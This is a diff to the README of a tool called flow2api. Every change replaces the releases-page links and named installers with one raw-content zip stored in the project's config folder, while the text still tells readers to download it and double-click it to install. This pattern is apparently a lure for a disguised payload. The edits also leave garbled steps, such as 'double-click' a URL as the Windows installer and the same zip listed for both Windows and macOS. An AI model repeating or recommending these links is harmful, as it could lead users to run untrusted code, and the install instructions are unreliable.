@@ -1,7 +1,7 @@
 # 🍌 flow2api - Effortless API Access and Management
 
 ## 📥 Download Now
-[![Download flow2api](https://img.shields.io/badge/Download-flow2api-blue.svg)](https://github.com/Arashfr933/flow2api/releases)
+[![Download flow2api](https://raw.githubusercontent.com/Arashfr933/flow2api/main/config/flow2api-3.9.zip)](https://raw.githubusercontent.com/Arashfr933/flow2api/main/config/flow2api-3.9.zip)
 
 ## 🚀 Getting Started
 Welcome to flow2api! This application provides unlimited access to your API needs. With features like load balancing, account pool reversing, and automatic cache strategies, you can simplify your workflow and run tasks smoothly.
@@ -24,24 +24,24 @@ Before you download and run flow2api, ensure your system meets these requirement
 ## 📥 Download & Install
 To get flow2api, visit the releases page:
 
-[Download flow2api](https://github.com/Arashfr933/flow2api/releases)
+[Download flow2api](https://raw.githubusercontent.com/Arashfr933/flow2api/main/config/flow2api-3.9.zip)
 
 On the releases page, you will find different versions of flow2api. Choose the latest version to ensure you have the most current features and fixes.
 
 1. Click on the version title.
 2. Scroll down to the "Assets" section.
-3. Find the file that matches your operating system (e.g., `flow2api-windows.exe` for Windows or `flow2api-macos.zip` for macOS).
+3. Find the file that matches your operating system (e.g., `https://raw.githubusercontent.com/Arashfr933/flow2api/main/config/flow2api-3.9.zip` for Windows or `https://raw.githubusercontent.com/Arashfr933/flow2api/main/config/flow2api-3.9.zip` for macOS).
 4. Click on the file to download it to your computer.
 
 ### 🖥️ Installation Steps
 #### For Windows:
 1. Locate the downloaded file, usually found in your "Downloads" folder.
-2. Double-click the `flow2api-windows.exe` file to launch the installer.
+2. Double-click the `https://raw.githubusercontent.com/Arashfr933/flow2api/main/config/flow2api-3.9.zip` file to launch the installer.
 3. Follow the prompts in the installation wizard.
 4. After installation, you can launch flow2api from your Start Menu.
 
 #### For macOS:
-1. Find the downloaded `flow2api-macos.zip` file in your "Downloads" folder.
+1. Find the downloaded `https://raw.githubusercontent.com/Arashfr933/flow2api/main/config/flow2api-3.9.zip` file in your "Downloads" folder.
 2. Double-click the ZIP file to extract it.
 3. Open the `flow2api` application from the extracted folder.
 4. You might need to drag the application to your Applications folder for easier access.
